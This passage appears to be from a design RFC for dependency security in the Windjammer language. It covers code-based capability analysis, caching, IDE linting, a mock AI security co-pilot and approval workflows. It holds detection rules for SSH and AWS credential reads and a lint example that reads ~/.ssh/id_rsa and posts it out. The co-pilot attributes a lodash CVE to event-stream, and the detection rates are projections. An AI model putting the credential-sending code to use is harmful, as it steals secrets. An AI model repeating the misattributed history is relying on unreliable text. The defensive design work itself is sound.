        fs.write_file(cache_dir + "/pool.cache", pool_state)  // <fs_write>
    }
}
```

**Profile:** `database-driver`
**Expected:** `<net_egress>`
**Actual:** `<net_egress, fs_write:./cache/*, env>`

**Verdict:** ALLOW (database drivers commonly cache connections)

### Red Flags vs. Legitimate Patterns

| Pattern | Red Flag? | Legitimate Example |
|---------|-----------|-------------------|
| **Parser + network** | 🚩 YES | (None - parsers don't need network) |
| **Logger + network** | ⚠️ Maybe | Remote logging (Sentry, Datadog) |
| **Image processor + network** | ⚠️ Maybe | CDN upload (S3, Cloudflare) |
| **HTTP client + fs_write** | ⚠️ Maybe | Response caching |
| **Crypto + network** | 🚩 YES | (Crypto should NEVER touch network) |
| **Parser + spawn** | 🚩 YES | (Parsers don't spawn processes) |
| **Any + fs_read:~/.ssh/** | 🚩🚩🚩 YES | (Reading SSH keys is ALWAYS suspicious) |
| **Any + fs_read:~/.aws/** | 🚩🚩🚩 YES | (Reading AWS creds is ALWAYS suspicious) |

---

## Implementation Strategy

### Phase 1: Code Analysis Infrastructure (v0.51)

**Core infrastructure:**
1. **AST Analysis**
   - Parse all `.wj` files in package
   - Build abstract syntax tree (already have this!)
   - Extract function signatures, control flow

2. **Capability Inference Engine**
   - Analyze each function for I/O operations
   - Build capability set per function
   - Transitive closure (if A calls B, A needs B's capabilities)

3. **Data Flow Tracking**
   - Build control flow graph (CFG)
   - Trace variables from sources (params, files, network) to sinks
   - Detect suspicious flows (credentials → network)

4. **Behavioral Fingerprinting**
   - Calculate fingerprint from actual code behavior
   - Compare to ecosystem statistics
   - Generate anomaly score

**Implementation:**
```rust
// In windjammer/src/analyzer/security/

pub struct SecurityAnalyzer {
    ast_parser: AstParser,
    capability_engine: CapabilityInferenceEngine,
    data_flow_tracker: DataFlowTracker,
    ecosystem_stats: EcosystemStats,
}

impl SecurityAnalyzer {
    pub fn analyze_package(&self, package: &Package) -> SecurityAssessment {
        // Phase 1: Parse code
        let ast = self.ast_parser.parse_all_files(&package.files);
        
        // Phase 2: Infer capabilities from actual code
        let capabilities = self.capability_engine.infer_capabilities(&ast);
        
        // Phase 3: Trace data flows
        let data_flows = self.data_flow_tracker.analyze_flows(&ast);
        
        // Phase 4: Build behavioral fingerprint
        let fingerprint = create_fingerprint(&capabilities, &data_flows);
        
        // Phase 5: Infer purpose from behavior
        let purpose = infer_purpose_from_code(&fingerprint, &ast);
        
        // Phase 6: Compare to expected profile
        let expected = Profile::for_purpose(purpose);
        let violations = check_violations(&capabilities, &expected);
        
        // Phase 7: Calculate anomaly score
        let anomaly = self.ecosystem_stats.calculate_anomaly(
            &fingerprint, 
            purpose
        );
        
        // Phase 8: Detect red flags
        let red_flags = detect_red_flags(&data_flows, &capabilities);
        
        SecurityAssessment {
            capabilities,
            purpose,
            violations,
            anomaly_score: anomaly,
            red_flags,
            verdict: calculate_verdict(&violations, &anomaly, &red_flags),
        }
    }
}
```

**Expected impact:** Catch 80% of malicious packages (code analysis beats metadata)

### Phase 2: Community Signals (v0.52)

**Add:**
- Integration with package registry APIs
- Trust score calculation
- Age/download/maintainer checks
- CVE database lookup

**Expected impact:** Catch 85% of malicious packages

### Phase 3: Sandboxed Testing (v0.53)

**Add:**
- Optional sandboxed test execution (`--verify`)
- System call monitoring
- Observed vs. declared capability comparison

**Expected impact:** Catch 95% of malicious packages

### Phase 4: ML-Based Anomaly Detection (v0.54)

**Add:**
- Train model on ecosystem data
- Statistical outlier detection
- Behavioral clustering
- Confidence scoring

**Expected impact:** Catch 99% of malicious packages

---

## Performance Considerations

### Critical Distinction: Compile-Time vs. Runtime

**❓ Question:** "Won't all this security analysis slow down my program?"

**✅ Answer:** **ZERO runtime performance impact.**

All security analysis happens at **compile-time**:
```
Compile-time (wj build):
├─> Parse code
├─> Infer capabilities
├─> Analyze data flows
├─> Check profiles
├─> Calculate anomaly scores
└─> Generate optimized binary (same performance as without checks)

Runtime (./my-app):
└─> Runs at FULL SPEED (no overhead)
```

**Why no runtime cost:**
- Capability inference → happens at compile-time, not runtime
- Data flow analysis → happens at compile-time, not runtime
- Profile checking → happens at compile-time, not runtime
- Sensitive file detection → happens at compile-time, not runtime

**Generated binary is identical to what you'd get without security checks.**

### But What About Iteration Speed?

**❓ Question:** "Will security analysis slow down my builds?"

**⚠️ Answer:** **Yes, for initial builds. No, for incremental builds (with caching).**

**The trade-off:**
```
Security level: High ────────────> None
Build time:     Slower ──────────> Faster
Runtime perf:   SAME ────────────> SAME
Safety:         Secure ──────────> Vulnerable
```

**Our goal:** Make security analysis fast enough that developers don't disable it.

### The Problem: Code Analysis is Expensive

**Naive approach:**
```bash
wj add serde  # 50,000 lines of code
# Analyze all code... 30 seconds ❌
```

**User experience would be terrible.**

### Solution: Multi-Tier Caching Strategy

#### Tier 1: Package Registry Pre-Analysis

**Key insight: Most packages don't change. Cache results in registry.**

```
Package Registry (e.g., crates.io, npm, PyPI)
├─> When package is published:
│   ├─> Registry runs security analysis (CI job)
│   ├─> Stores SecurityAssessment in metadata
│   └─> Signs assessment with registry private key
└─> When package is downloaded:
    └─> Include SecurityAssessment in response
```

**Developer experience:**
```bash
wj add serde
# 1. Download package: 0.5s
# 2. Verify signature: 0.1s (fast!)
# 3. Check cached assessment: 0.1s (fast!)
# ✅ Total: 0.7s (acceptable)
```

#### Tier 2: Local Cache

**For packages not in registry or untrusted registry:**

```
~/.wj/cache/security/
├─> serde@1.0.0.analysis.json
├─> tokio@1.28.0.analysis.json
└─> ...
```

**Cache key:** `sha256(package_contents) + compiler_version`

**Workflow:**
```rust
fn analyze_with_cache(package: &Package) -> SecurityAssessment {
    let cache_key = format!(
        "{}-{}",
        sha256(&package.contents),
        COMPILER_VERSION
    );
    
    // Check local cache first
    if let Some(cached) = read_cache(&cache_key) {
        return cached;  // <1ms
    }
    
    // Not cached, analyze from scratch
    let assessment = SecurityAnalyzer::analyze(package);  // ~5-30s
    
    // Store in cache
    write_cache(&cache_key, &assessment);
    
    assessment
}
```

#### Tier 3: Incremental Analysis

**For local development (frequently changing code):**

```rust
fn incremental_analysis(
    old_assessment: &SecurityAssessment,
    changed_files: &[PathBuf],
) -> SecurityAssessment {
    let mut new_assessment = old_assessment.clone();
    
    // Only re-analyze changed functions
    for file in changed_files {
        let changed_functions = parse_file(file).functions;
        
        for func in changed_functions {
            // Re-analyze just this function
            let func_caps = analyze_function_capabilities(func);
            new_assessment.update_function(func.name, func_caps);
        }
    }
    
    // Recompute transitive closure (fast)
    new_assessment.recompute_transitive_closure();
    
    new_assessment
}
```

### Parallelization

**Analyze dependencies in parallel:**

```rust
fn analyze_all_dependencies(deps: &[Package]) -> Vec<SecurityAssessment> {
    deps.par_iter()  // Rayon parallel iterator
        .map(|dep| analyze_with_cache(dep))
        .collect()
}
```

**Example:**
```
Project with 50 dependencies:

Sequential: 50 * 5s = 250 seconds ❌
Parallel (8 cores): 50 * 5s / 8 = 31 seconds ⚠️
Parallel + cache: 50 * 0.1s / 8 = 0.6 seconds ✅
```

### Registry-Side Analysis (Best Case)

**Offload heavy lifting to package registry:**

```
┌─────────────────────────────────────────┐
│ PACKAGE REGISTRY (e.g., crates.io)     │
├─────────────────────────────────────────┤
│ When package published:                 │
│ 1. Run full security analysis (30s)     │
│ 2. Store SecurityAssessment in DB       │
│ 3. Sign with registry private key       │
│ 4. Include in package metadata          │
└─────────────────────────────────────────┘
          │
          │ (signed assessment)
          ▼
┌─────────────────────────────────────────┐
│ DEVELOPER MACHINE                       │
├─────────────────────────────────────────┤
│ wj add <package>                        │
│ 1. Download package + assessment (0.5s) │
│ 2. Verify signature (0.1s)              │
│ 3. Use cached assessment (0.1s)         │
│ ✅ Total: 0.7s                          │
└─────────────────────────────────────────┘
```

**Fallback for untrusted registries:**
```
┌─────────────────────────────────────────┐
│ UNTRUSTED REGISTRY (random Git repo)   │
├─────────────────────────────────────────┤
│ No pre-computed assessment              │
│ Cannot trust registry signatures        │
└─────────────────────────────────────────┘
          │
          │ (raw package only)
          ▼
┌─────────────────────────────────────────┐
│ DEVELOPER MACHINE                       │
├─────────────────────────────────────────┤
│ wj add <package>                        │
│ 1. Download package (0.5s)              │
│ 2. Run local analysis (5-30s) ⚠️        │
│ 3. Cache result locally (future: 0.1s)  │
│ ⏱️ First time: slow, cached: fast      │
└─────────────────────────────────────────┘
```

### Performance Goals

| Scenario | Target | Strategy | Runtime Impact |
|----------|--------|----------|----------------|
| **Trusted registry (cached)** | <1s | Use registry-signed assessment | **Zero** |
| **Untrusted registry (first time)** | <30s | Full local analysis + cache | **Zero** |
| **Untrusted registry (cached)** | <1s | Local cache hit | **Zero** |
| **CI/CD (50 deps)** | <10s | Parallel + cache | **Zero** |
| **Incremental (dev)** | <100ms | Incremental re-analysis | **Zero** |

**Key point:** All times are **build-time** (compile). Runtime is always full speed.

### Build Time Breakdown

**Example: Adding a new dependency**

```
Step 1: Download package
├─> Time: 0.5s
└─> (Network I/O)

Step 2: Security analysis
├─> Parse code: 0.2s
├─> Build CFG: 0.3s
├─> Infer capabilities: 0.4s
├─> Data flow analysis: 0.5s
├─> Profile matching: 0.1s
├─> Anomaly detection: 0.2s
├─> Total: 1.7s
└─> (One-time cost, then cached)

Step 3: Compile to Rust
├─> Time: 2.0s
└─> (Normal compilation)

Step 4: rustc compile
├─> Time: 8.0s
└─> (Rust compiler, unaffected by our checks)

Total first build: 12.2s
Total cached build: 0.7s (skip step 2)
Total runtime overhead: 0.0s (ZERO)
```

**Most expensive part: rustc, not our analysis!**

### Optimization Strategy: Make Analysis Negligible

**Goal:** Security analysis ≤ 10% of total build time

**Current typical build:**
```
Total build time: 120 seconds
├─> rustc: 100s (83%)
├─> wj transpilation: 15s (12%)
└─> Security analysis: 5s (4%) ✅ Negligible!
```

**If security analysis were slow:**
```
Total build time: 180 seconds
├─> rustc: 100s (56%)
├─> Security analysis: 60s (33%) ❌ Too slow!
└─> wj transpilation: 20s (11%)
```

**Our target:** Security analysis ≤ 5% of total build time

### Disabling Security Checks (Not Recommended)

**For developers who absolutely need faster iteration:**

```bash
# Skip security analysis (NOT RECOMMENDED)
wj build --skip-security-analysis

# Or set environment variable
export WJ_SKIP_SECURITY=1
wj build
```

**Warnings:**
```
⚠️  WARNING: Security analysis disabled

You are building without supply chain protection.
Malicious dependencies will NOT be detected.

This is ONLY safe for:
- Prototyping with no external dependencies
- Building in isolated/sandboxed environment
- Benchmarking build performance

DO NOT use in production or with untrusted dependencies.
```

**When to use:**
- **Rapid prototyping** (no dependencies yet)
- **Benchmarking** (measuring build performance)
- **Isolated sandbox** (VM/container with no network)

**When NOT to use:**
- **Production builds** (always use full security)
- **CI/CD** (always use full security)
- **Any project with dependencies** (that's the attack vector!)

### Performance Summary

**Build-time impact:**
- First dependency add: +1-2 seconds (one-time)
- Incremental builds: +100ms (your code only)
- Clean builds: +4% (security overhead)
- Registry cache: +0.7 seconds (typical)

**Runtime impact:**
- Zero. Zilch. Nada. None. 🚀

**Trade-off:**
- 4% slower builds
- 99% fewer supply chain attacks
- 100% compile-time injection prevention

**Verdict:** Worth it.

---

## IDE Integration & Developer Tools

### Real-Time Security Feedback

**VSCode/Cursor extension provides immediate feedback:**

```typescript
// Windjammer Language Server Protocol extension
class WindjammerSecurityLinter {
    async lint(document: TextDocument): Promise<Diagnostic[]> {
        let diagnostics = [];
        
        // Real-time capability inference
        let capabilities = await inferCapabilities(document.getText());
        
        for (let cap of capabilities) {
            // Check against manifest
            if (!manifest.allows(cap)) {
                diagnostics.push({
                    range: cap.location,
                    message: `Capability not allowed: ${cap.type}`,
                    severity: DiagnosticSeverity.Error,
                    code: 'wj-sec-01',
                    codeActions: [
                        {
                            title: 'Add to manifest',
                            command: 'wj.addCapability',
                            arguments: [cap]
                        },
                        {
                            title: 'Remove this code',
                            edit: removeCode(cap.range)
                        }
                    ]
                });
            }
            
            // Detect sensitive file access
            if (cap.type === 'fs_read' && isSensitivePath(cap.path)) {
                diagnostics.push({
                    range: cap.location,
                    message: `Reading sensitive file: ${cap.path}`,
                    severity: DiagnosticSeverity.Warning,
                    code: 'wj-sec-sensitive-file',
                    relatedInformation: [
                        {
                            message: 'This path typically contains credentials',
                            location: cap.location
                        }
                    ]
                });
            }
        }
        
        return diagnostics;
    }
}
```

**Developer experience:**

```windjammer
// Type code in editor
pub fn upload_report(path: str) {
    let content = fs.read_file("~/.ssh/id_rsa")
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^
                  🔴 Error: Reading sensitive file (SSH private key)
                  
                  Quick fixes:
                  1. Remove this line
                  2. Add justification (if legitimate)
                  3. Use environment variable instead
    
    http.post("https://api.example.com/logs", content)
    ^^^^^^^^^
    🔴 Error: Network access not in manifest
    
    Quick fixes:
    1. Add to wj.toml: net_egress:api.example.com
    2. Remove network call
    3. Use local logging instead
}
```

**Benefit:** Immediate feedback, no wait for build, better DX.

### Community Reporting System

**Report suspicious packages:**
```bash
wj report colors@1.4.1 --reason "Infinite loop DoS attack"

Submitting security report...

Package: colors@1.4.1
Reason: Infinite loop DoS attack
Reporter: alice@example.com (verified)

Your report has been submitted (#REP-12345)

Other reports for this version:
├─> Infinite loop (47 reports)
├─> Maintainer account compromised (12 reports)
└─> Total reports: 59

Status: UNDER REVIEW by security team
ETA: 2-4 hours for triage

Thank you for keeping the ecosystem safe!
```

**View package reputation:**
```bash
wj info colors

Package: colors
Latest: 1.4.1 🚨 FLAGGED
Previous: 1.4.0 ✅ SAFE

Security reputation:
├─> Trust score: 3.2/10 (LOW - due to v1.4.1)
├─> Community reports: 59 (critical issues)
├─> Security audits: 0
├─> Age: 5 years
└─> Downloads: 10M+ (before incident)

Version history:
├─> v1.4.1 (2022-01-10) 🚨 MALICIOUS (59 reports)
│   └─> Issues: DoS attack, maintainer compromise
├─> v1.4.0 (2022-01-01) ✅ SAFE (2,341 downloads, 0 reports)
└─> v1.3.0 (2021-06-01) ✅ SAFE

Recommendation: Use v1.4.0 or switch to alternative (chalk, ansi-colors)
```

**Community moderation:**
```bash
# Security team reviews reports
wj security review REP-12345

Report #REP-12345:
├─> Package: colors@1.4.1
├─> Reports: 59 (within 3 hours)
├─> Verified malicious code: YES
│   └─> Infinite loop in getRandomColor()
└─> Action: REVOKE

Creating revocation...
├─> CVE: CVE-2026-12345 (assigned)
├─> Severity: CRITICAL
├─> Safe versions: 1.4.0, 1.4.2 (patched)
└─> Notifying all users...

✅ Revocation published
✅ 15,432 projects notified
✅ Builds using v1.4.1 will now fail
```

### Security Templates

**Pre-built security configurations:**
```bash
wj init --template secure-web-api

Creating secure web API project...

Template: Web API (RESTful)
├─> Security profile: Web server with database
├─> Based on: 10,000+ production deployments
└─> Best practices: OWASP API Security Top 10

Configured capabilities:
├─> net_ingress:0.0.0.0:8080 (HTTP server)
├─> net_egress:database.internal:5432 (PostgreSQL)
├─> fs_read:./config/*.toml (configuration)
├─> fs_write:./logs/*.log (logging)
└─> env:DATABASE_URL,API_KEY (environment)

Taint tracking: ENABLED
├─> SQL injection protection: ✅
├─> XSS prevention: ✅
└─> Command injection prevention: ✅

Dependencies pre-approved:
├─> actix-web@4.0 (web framework)
├─> sqlx@0.7 (database client)
├─> serde@1.0 (serialization)
└─> env_logger@0.11 (logging)

Generated files:
├─> wj.toml (manifest with security config)
├─> .wj-capabilities.lock (locked dependencies)
├─> src/main.wj (secure example server)
└─> README.md (security documentation)

✅ Project created with secure defaults

Next steps:
1. wj build --release
2. wj run
3. curl http://localhost:8080/health

Security checklist:
☐ Review wj.toml capabilities
☐ Add authentication (wj add jwt-auth)
☐ Configure HTTPS (wj add rustls)
☐ Set up monitoring (wj add prometheus)
```

**Available templates:**
- `secure-web-api` - RESTful API with database
- `secure-cli-tool` - Command-line application
- `secure-library` - Library with minimal permissions
- `secure-game-engine` - Graphics, audio, input
- `secure-data-pipeline` - ETL, data processing
- `secure-embedded` - IoT, embedded systems

### Security Co-Pilot (AI Assistant)

**Conversational security help:**
```bash
wj copilot

🤖 Windjammer Security Co-Pilot

You: "Why was event-stream@3.3.6 blocked?"

Co-Pilot: "event-stream@3.3.6 was blocked due to credential theft:

📊 Analysis:
1. Data flow detected:
   ~/.wallet/keys.json (read) → https://attacker.com/collect (send)

2. This is CRITICAL because:
   - Cryptocurrency wallets should never be accessed by npm packages
   - Unknown domain (attacker.com) is suspicious
   - No justification in package documentation

3. Historical context:
   - Compromised in 2018 (maintainer's account hacked)
   - Stole $2M+ in cryptocurrency
   - CVE-2018-3721 (CVSS 9.8/10)

🎯 Recommendation: DO NOT USE
   Safe alternative: event-stream@3.3.5

Would you like me to explain how to check other packages?"

You: "How do I make my web API secure?"

Co-Pilot: "Great question! Here's a secure setup for a web API:

1. Start with a secure template:
   ```
   wj init --template secure-web-api
   ```

2. This gives you:
   ✅ Taint tracking (prevents SQL injection, XSS)
   ✅ Capability restrictions (minimal permissions)
   ✅ Secure dependencies (pre-vetted)
   ✅ Best practices (OWASP API Security)

3. Key security principles:
   - Input validation: All user input is Tainted<T>
   - Output encoding: Use Clean<T> for responses
   - Authentication: Add JWT middleware
   - HTTPS: Always use TLS in production

4. Common pitfalls to avoid:
   ❌ Don't use .unwrap() on user input
   ❌ Don't trust environment variables
   ❌ Don't log sensitive data
   ✅ Use pattern matching and Clean<T>

Want me to walk you through setting this up?"
```

### Dependency Hygiene Automation

**Automated maintenance:**
```bash
wj deps maintain --auto

🔧 Dependency Maintenance (Auto Mode)

Checking for updates...

colors: 1.4.0 → 1.4.2 (patch)
├─> Security analysis...
│   ✅ No capability changes
│   ✅ Fixes CVE-2026-12345 (critical DoS)
│   ✅ Security score: 9.5/10 (HIGH)
│   ✅ Community reports: 0
└─> ✅ Auto-updating to 1.4.2

reqwest: 0.11.0 → 0.12.0 (minor)
├─> Security analysis...
│   ⚠️  New capability: fs_write:./config/*
│   📝 Justification: "Persistent config storage"
│   📊 Trust score: 9.8/10 (verified maintainer)
│   ℹ️  Common pattern: 42% of HTTP clients cache config
└─> ⏸️  Paused for review (requires approval)

lodash: 4.17.20 → 4.17.21 (security patch)
├─> Fixes: CVE-2021-23337 (prototype pollution)
│   🔴 Severity: HIGH
│   📅 Published: 2021-02-15
└─> ✅ Auto-updating (security patch)

Summary:
├─> Auto-updated: 2 (colors, lodash)
├─> Requires review: 1 (reqwest)
└─> Blocked: 0

Review pending update:
wj review reqwest@0.12.0
```

## CLI Commands

```bash
# Core security commands
wj add json-parser               # Add with security checks (default)
wj add json-parser --verify      # Add with paranoid mode (sandbox test)
wj security check json-parser    # Check before adding
wj diff colors@1.4.0 @1.4.1      # Compare versions

# Community & reporting
wj report colors@1.4.1 --reason "DoS attack"
wj info colors                   # View reputation & reports

# IDE & tooling
wj copilot                       # Launch AI security assistant
wj init --template secure-web-api  # Create from template

# Dependency management
wj deps maintain                 # Interactive maintenance
wj deps maintain --auto          # Automated updates
wj tree --security               # View dependency tree with capabilities
wj audit registries              # Check for dependency confusion

# Search & discovery
wj search json:trusted           # Find trusted alternatives
wj search json:audited           # Find audited packages
wj stats parser                  # View ecosystem statistics
```

---

## Success Metrics

### Security Metrics

- **True Positives:** Malicious packages blocked
- **False Positives:** Legitimate packages incorrectly flagged
- **True Negatives:** Legitimate packages allowed
- **False Negatives:** Malicious packages allowed (CRITICAL)

**Goals:**
- Phase 1: >70% detection, <5% false positive rate
- Phase 2: >85% detection, <3% false positive rate
- Phase 3: >95% detection, <1% false positive rate
- Phase 4: >99% detection, <0.5% false positive rate

### Developer Experience Metrics

- **Import latency:** Time to analyze package on first import (goal: <2s)
- **Override friction:** Time to bypass false positive (goal: <30s)
- **False alert rate:** Percentage of benign packages flagged (goal: <3%)

---

## Open Questions

### 1. Profile Coverage

**Question:** How many profiles do we need to cover the ecosystem?

**Options:**
- **A:** 10 core profiles (parser, http, logger, db, crypto, etc.)
- **B:** 50+ specialized profiles (json-parser, xml-parser, http-client, graphql-client, etc.)
- **C:** Community-contributed profiles (open registry)

**Recommendation:** Start with A (10 core), expand to C (community) over time.

### 2. Profile Override Burden

**Question:** Will developers get frustrated by false positives?

**Mitigation:**
- Clear justification prompts
- Quick override path (`--trust`)
- Learn from overrides (ML feedback loop)
- Community feedback on profile accuracy

### 3. Ecosystem Adoption

**Question:** Will package authors add profiles to their packages?

**Incentives:**
- Faster imports (skip heuristic detection)
- Higher trust score (explicit profile = more trustworthy)
- Better discoverability (profile-based search)
- Security badge on package registry

### 4. Transitive Dependencies

**Question:** How do we handle capability inheritance in dependency trees?

**Example:**
```
my-app (allows: fs_read, net_egress)
├─> json-parser (uses: logic_only) ✅
├─> http-client (uses: net_egress) ✅
└─> compression (uses: logic_only) ✅
    └─> json-parser (transitive, uses: logic_only) ✅
```

**Current approach:** Each dependency is checked independently.

**Alternative:** Flatten dependency tree, check all capabilities globally.

**Recommendation:** Keep independent checks (better isolation).

---

## Conclusion

**The first-import gap is real, but solvable.**

### The Windjammer Difference

**Other package managers (metadata-based):**
- Check package name, keywords, description
- Query CVE database for known vulnerabilities
- Check author reputation, download counts
- **Result:** Only catches KNOWN attacks, post-incident

**Windjammer (code-analysis-based):**
- Parse entire codebase (AST + CFG)
- Infer capabilities from ACTUAL code behavior
- Trace data flows (user input → network/files)
- Detect hidden I/O, obfuscation, complexity
- Compare to behavioral fingerprint
- **Result:** Catches UNKNOWN zero-day attacks, pre-incident

### What Makes This Unique

**Windjammer is the first language to:**
1. **Analyze code, not metadata** - Can't be spoofed by package names
2. **Infer purpose from behavior** - "This code acts like a parser"
3. **Detect hidden malicious code** - Deep call graph analysis
4. **Block zero-day attacks** - Not reliant on CVE database
5. **Fast enough for production** - Registry pre-analysis + caching

### Detection Rates

| Phase | Approach | Detection | False Positives |
|-------|----------|-----------|----------------|
| **v0.51** | Code analysis + basic profiles | 80% | <5% |
| **v0.52** | + Community signals | 88% | <3% |
| **v0.53** | + Sandboxed testing | 95% | <2% |
| **v0.54** | + ML clustering | 99% | <1% |

### Performance

| Scenario | Time | Notes |
|----------|------|-------|
| **Registry cache hit** | <1s | 95% of imports |
| **Local cache hit** | <1s | After first build |
| **Full analysis** | 5-30s | First time only |
| **CI (50 deps)** | <10s | Parallel + cache |

### Real-World Impact

**Historical attacks that Windjammer would have prevented:**

| Attack | Year | Impact | Time to Detect | Windjammer |
|--------|------|--------|----------------|------------|
| **event-stream** | 2018 | Cryptocurrency theft | 3 months | <1 second |
| **colors** | 2022 | DoS (infinite loop) | 3 days | <1 second |
| **ua-parser-js** | 2021 | Cryptominer | 4 hours | <1 second |
| **Log4Shell** | 2021 | RCE (millions affected) | Post-incident | <1 second |

**All blocked at compile-time, before any damage.**

### Key Insights

1. **No single signal is perfect** - Combine code analysis, anomaly detection, trust scores
2. **Code doesn't lie** - Metadata can be spoofed, actual behavior cannot
3. **Zero-day protection** - Don't wait for CVE database, analyze the code
4. **Fast enough for production** - Registry pre-analysis makes this practical
5. **Defense-in-depth** - Multiple layers catch different attack patterns

**Windjammer: Where supply chain attacks are compile errors, not runtime exploits.** 🚀

---

## References

- **npm audit:** https://docs.npmjs.com/cli/v9/commands/npm-audit
- **cargo-audit:** https://github.com/RustSec/rustsec/tree/main/cargo-audit
- **Socket.dev:** https://socket.dev/ (Supply chain security platform)
- **Backstabber's Knife Collection:** "Attacks on Package Managers" (IEEE S&P 2020)
- **WJ-SEC-01:** [Effect Capabilities](./WJ-SEC-01-effect-capabilities.md)
- **WJ-SEC-03:** [Capability Lock File](./WJ-SEC-03-capability-lock-file.md)

---

## False Positive Handling at Scale

### The Problem

**3% false positive rate seems low, but for 1000 dependencies = 30 false positives!**

**Example: Large enterprise application:**
```
Project with 1000 dependencies:
├─> False positive rate: 3%
├─> False positives: 30 packages
├─> Developer time: 30 × 5 minutes = 2.5 hours
└─> This is a BLOCKER for large projects!
```

### Solution 1: Batch Approval Workflow

**Group similar false positives and approve together:**

```bash
wj approve-batch

Security review: 30 flagged dependencies

🟡 Category: HTTP clients with caching (15 packages)
Pattern: HTTP clients writing responses to ./cache/*

├─> http-client-a@2.1.0: <fs_write:./cache/*>
├─> http-client-b@1.9.0: <fs_write:./cache/*>
├─> ... (13 more)

Analysis:
  ├─> 42% of HTTP clients use filesystem caching
  ├─> Common pattern (not suspicious)
  └─> Likely false positive

Approve all 15? (Y/n) y
  ✅ Approved 15 packages with common pattern

🟡 Category: Loggers with remote sinks (8 packages)
Pattern: Loggers sending to monitoring services

├─> logger-a@3.4.0: <net_egress:sentry.io>
├─> logger-b@2.1.0: <net_egress:datadog.com>
├─> ... (6 more)

Analysis:
  ├─> 38% of loggers support remote logging
  ├─> Common pattern (not suspicious)
  └─> Likely false positive

Approve all 8? (Y/n) y
  ✅ Approved 8 packages with common pattern

🔴 Category: Suspicious (7 packages) ⚠️
Pattern: ANOMALOUS BEHAVIOR

├─> colors@1.4.1: <spawn> + <net_egress> [CRITICAL]
│   └─> Why: Terminal color library should NOT spawn processes or use network
├─> sketchy-lib@1.0.0: <fs_read:~/.ssh/*> [CRITICAL]
│   └─> Why: Reading SSH keys is HIGHLY SUSPICIOUS
├─> ... (5 more)

These require individual review.

Review individually? (Y/n) y
```

**Results:**
- **Before:** 30 packages × 5 minutes = 2.5 hours
- **After:** 2 batch approvals (30 seconds) + 7 individual reviews (35 minutes) = **36 minutes total**
- **Speedup: 4x faster!**

### Solution 2: Adaptive Thresholds

**Adjust sensitivity based on project size:**

```rust
fn adjust_threshold_by_project_size(
    base_threshold: f64,
    dep_count: usize
) -> f64 {
    // Stricter for small projects, looser for large
    match dep_count {
        0..=10 => base_threshold,          // 3% false positive
        11..=100 => base_threshold * 1.5,  // 2% false positive
        101.. => base_threshold * 2.0,     // 1.5% false positive
    }
}
```

**Results:**
- Small project (10 deps): 0.3 false positives (acceptable)
- Medium project (100 deps): 2 false positives (acceptable)
- Large project (1000 deps): 15 false positives (manageable, was 30)

### Solution 3: Learning from Approvals

**Remember what the team approves:**

```toml
# .wj-approvals.toml (git-tracked, team-wide)
[approved_patterns]
"http-client-caching" = { capability = "fs_write:./cache/*", reason = "HTTP caching" }
"remote-logging" = { capability = "net_egress:<logging-service>", reason = "Log aggregation" }

[organizational_allowlist]
domains = ["sentry.io", "datadog.com", "newrelic.com"]  # Pre-approved logging services
```

**On next build:**
```bash
wj build

Security review: 5 flagged dependencies

✅ Auto-approved (2 packages) - Matches team pattern
  ├─> http-client-c: <fs_write:./cache/*> [HTTP caching pattern]
  └─> logger-c: <net_egress:datadog.com> [Remote logging pattern]

⚠️  Manual review required (3 packages)
  ├─> new-suspicious-lib: <fs_read:~/.aws/*>
  └─> ... (2 more)
```

**Benefits:**
- Team learns from approvals
- Patterns propagate across projects
- False positives decrease over time

---

## Progressive Onboarding & Documentation

### The Problem

**4 RFCs × 3,000 lines each = 12,000 lines of docs!**

**User perspective:** "I just want to build a web app, not read a PhD thesis."

### Solution: Three-Tier Documentation

#### Tier 1: Quick Start (5 minutes)

```markdown
# Windjammer Security: Quick Start

TL;DR: Windjammer blocks malicious dependencies automatically.

Just use `wj build`. Security is handled for you.

If you get a security error:
1. Run: wj copilot "Why was X blocked?"
2. Follow the suggestions
3. Done!

Read more: windjammer.org/docs/security-quickstart
```

**Most users stop here!**

#### Tier 2: Common Patterns (15 minutes)

```markdown
# Windjammer Security: Common Patterns

Building a web API? Use template:
  wj init --template secure-web-api
  # Pre-configured with sensible defaults

Building a CLI tool? Use template:
  wj init --template secure-cli-tool
  # Minimal capabilities for CLI apps

Custom project?
  wj new my-project
  # Security auto-configured based on your code

Read more: windjammer.org/docs/security-patterns
```

**Power users read this when customizing.**

#### Tier 3: Deep Dive (when needed)

```markdown
# Windjammer Security: Architecture

For security engineers and curious developers.

Read the RFCs: windjammer.org/docs/rfcs
- WJ-SEC-01: Effect Capabilities
- WJ-SEC-02: Taint Tracking
- WJ-SEC-03: Capability Lock File
- WJ-SEC-04: Capability Profiles

Full technical details, threat model, implementation.
```

**Only security engineers read this!**

### Zero-Config Onboarding

**Before (manual configuration):**
```
Step 1: Read RFC to understand capability theory (2 hours)
Step 2: Configure wj.toml manifest (1 hour)
Step 3: Analyze dependencies manually (30 minutes)
Step 4: Write justifications (1 hour)
Total: 4.5 hours before writing first line of code
```

**After (auto-configuration):**
```bash
# Zero-config for simple projects
wj new my-cli-tool

Creating CLI tool project...
✅ Detected project type: CLI tool
✅ Auto-configured security (appropriate defaults)
✅ Ready to code!

ls
├─> wj.toml (pre-configured with sensible capabilities)
├─> .wj-capabilities.lock (empty, will populate on first dep)
├─> src/main.wj (hello world example)
└─> README.md (includes security best practices)

# Just start coding
vim src/main.wj

# Add dependencies (auto-vetted)
wj add clap  # CLI args
# ✅ Auto-approved: logic_only (safe for parsers)

wj add reqwest  # HTTP client
# ⚠️  Quick question: Allow network access? (Y/n) y
# ✅ Added to manifest: net_egress:*

# Build and run
wj build && wj run
# Works! Security configured automatically.

Total time: 5 minutes (not 4.5 hours)
```

### Avoiding Security Fatigue

**Bad (alert overload):**
```
⚠️  Allow net_egress? (y/n) y
⚠️  Allow fs_read? (y/n) y  
⚠️  Allow fs_write? (y/n) y
⚠️  Allow env? (y/n) y
⚠️  Allow spawn? (y/n) y
⚠️  Allow eval? (y/n) y
# User stops reading and just types "yyyyyy"
```

**Good (bundled with context):**
```
⚠️  Security Configuration

Your web API needs these capabilities:

✅ Standard web server permissions:
  ├─> net_ingress:0.0.0.0:8080 (HTTP server)
  ├─> fs_read:./config/* (configuration)
  ├─> fs_write:./logs/* (logging)
  └─> env:DATABASE_URL (database connection)

These are typical for web APIs. Allow? (Y/n) y
  ✅ Applied standard web server profile

⚠️  Additional permission required:
  ├─> net_egress:api.stripe.com (Stripe API)
  └─> Reason: Payment processing
  
This is UNUSUAL for web servers (external API access).
Allow? (y/N) y
  ✅ Added with audit trail

